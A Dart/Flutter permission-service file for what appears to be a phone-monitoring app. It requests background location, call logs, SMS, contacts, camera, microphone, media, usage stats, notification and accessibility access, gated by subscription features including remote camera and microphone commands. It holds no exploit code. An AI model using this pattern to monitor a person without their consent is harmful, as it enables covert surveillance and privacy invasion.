import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:permission_handler/permission_handler.dart';
import '../core/utils/logger.dart';
import '../platform/tracking_channel.dart';

class PermissionService {
  const PermissionService();

  // ── Status checks ──────────────────────────────────────────────────────────

  Future<bool> isLocationGranted() => Permission.locationAlways.isGranted;
  Future<bool> isCallLogGranted()  => Permission.phone.isGranted;
  Future<bool> isSmsGranted()      => Permission.sms.isGranted;
  Future<bool> isContactsGranted() => Permission.contacts.isGranted;
  Future<bool> isCameraGranted()   => Permission.camera.isGranted;
  Future<bool> isMicGranted()      => Permission.microphone.isGranted;
  Future<bool> isNotificationGranted() => Permission.notification.isGranted;

  Future<bool> isMediaGranted() async {
    final photos  = await Permission.photos.isGranted;
    final videos  = await Permission.videos.isGranted;
    final storage = await Permission.storage.isGranted;
    return photos || videos || storage;
  }

  // Uses native PowerManager.isIgnoringBatteryOptimizations() — more reliable
  // than permission_handler on OEM devices (Vivo, Xiaomi, Samsung, etc.)
  Future<bool> isBatteryOptimisationExempt() =>
      TrackingChannel.instance.isBatteryOptimizationExempt();

  Future<bool> isUsageStatsGranted() =>
      TrackingChannel.instance.hasUsagePermission();

  Future<bool> isNotificationAccessGranted() =>
      TrackingChannel.instance.isNotificationAccessGranted();

  Future<bool> isAccessibilityGranted() =>
      TrackingChannel.instance.isAccessibilityGranted();

  // ── Request / open settings ────────────────────────────────────────────────

  /// Requests all standard runtime permissions in the correct order.
  /// Returns true if foreground location (the minimum) is granted.
  Future<bool> requestEssentialPermissions() async {
    await Permission.notification.request();

    final fgLoc = await Permission.locationWhenInUse.request();
    if (!fgLoc.isGranted) {
      appLogger.w('Foreground location denied');
      return false;
    }

    await Permission.locationAlways.request();
    await Permission.ignoreBatteryOptimizations.request();
    return true;
  }

  /// Request every runtime permission at once (for the onboarding screen).
  Future<void> requestAllRuntimePermissions() async {
    // 1. Notification (Android 13+)
    await Permission.notification.request();

    // 2. Location — foreground must come before background
    final fg = await Permission.locationWhenInUse.request();
    if (fg.isGranted) await Permission.locationAlways.request();

    // 3. Standard runtime permissions (grouped request)
    await [
      Permission.phone,       // call logs
      Permission.sms,         // SMS read
      Permission.contacts,
      Permission.camera,
      Permission.microphone,
      Permission.photos,      // Android 13+
      Permission.videos,      // Android 13+
      Permission.storage,     // pre-13 fallback
    ].request();

    // 4. Battery optimisation — must be requested individually; it fires a
    //    separate system dialog (ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
    //    and is silently ignored when bundled with other permissions.
    await Permission.ignoreBatteryOptimizations.request();
  }

  // ── Individual runtime request helpers (used by TrackingHomePage card) ──────

  Future<bool> requestCallLogPermission() async {
    final s = await Permission.phone.request();
    return s.isGranted;
  }

  Future<bool> requestSmsPermission() async {
    final s = await Permission.sms.request();
    return s.isGranted;
  }

  /// Request only the runtime permissions required by [features].
  Future<void> requestPlanPermissions(Object features) async {
    // Use a record to avoid a circular import with subscription_service.dart.
    // We access known bool fields by name using mirrors-free duck typing via a Map.
    final f = _featureMap(features);

    // 1. Notification (Android 13+) — always needed
    await Permission.notification.request();

    // 2. Location — foreground must come before background
    final fg = await Permission.locationWhenInUse.request();
    if (fg.isGranted) await Permission.locationAlways.request();

    // 3. Conditional runtime permissions based on plan
    final toRequest = <Permission>[];
    if (f['callLogs']       == true) toRequest.add(Permission.phone);
    if (f['smsLogs']        == true) toRequest.add(Permission.sms);
    if (f['contacts']       == true) toRequest.add(Permission.contacts);
    if (f['gallery']        == true) {
      toRequest.addAll([Permission.photos, Permission.videos, Permission.storage]);
    }
    if (f['remoteCommands'] == true) {
      toRequest.addAll([Permission.camera, Permission.microphone]);
    }
    if (toRequest.isNotEmpty) await toRequest.request();

    // 4. Battery optimisation — always needed to stay alive
    await Permission.ignoreBatteryOptimizations.request();
  }

  // Convert a SubscriptionFeatures object to a plain map without importing it
  Map<String, dynamic> _featureMap(Object f) {
    try {
      // SubscriptionFeatures has a toJson() method — use it
      // ignore: avoid_dynamic_calls
      return (f as dynamic).toJson() as Map<String, dynamic>;
    } catch (_) {
      return {};
    }
  }

  Future<bool> requestContactsPermission() async {
    final s = await Permission.contacts.request();
    return s.isGranted;
  }

  Future<bool> requestMediaPermission() async {
    final photos = await Permission.photos.request();
    final videos = await Permission.videos.request();
    return photos.isGranted || videos.isGranted;
  }

  // ── Open Settings for special (non-grantable-via-dialog) permissions ───────

  Future<void> openBatteryOptimizationSettings() =>
      TrackingChannel.instance.openBatterySettings();

  Future<void> openNotificationAccessSettings() =>
      TrackingChannel.instance.openNotificationSettings();

  Future<void> openUsageStatsSettings() =>
      TrackingChannel.instance.requestUsagePermission();

  Future<void> openAccessibilitySettings() =>
      TrackingChannel.instance.openAccessibilitySettings();

  Future<void> openSystemSettings() => openAppSettings();
}

final permissionServiceProvider = Provider<PermissionService>(
  (_) => const PermissionService(),
  name: 'permissionService',
);
